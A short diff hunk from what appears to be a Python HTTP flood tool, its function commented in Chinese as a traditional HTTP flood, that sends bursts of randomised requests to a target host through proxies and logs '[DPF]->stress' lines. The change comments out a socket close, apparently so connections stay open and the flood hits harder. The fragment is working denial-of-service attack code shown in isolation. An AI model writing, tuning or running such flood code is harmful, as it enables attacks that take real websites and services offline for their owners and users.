@@ -450,7 +450,7 @@ def send_requests(): #傳統HTTP FLOOD
                 for _ in range(100):
                     s.send(f"{method} {path}?{rC(rand)}{rC(rand)}={rInt(1,123456789)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode('utf-8'))
                 print(f"[DPF]->stress \033[36m{host}\033[0m from: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
-                s.close()
+                # s.close()
             except:
                 print(f"[DPF]->proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
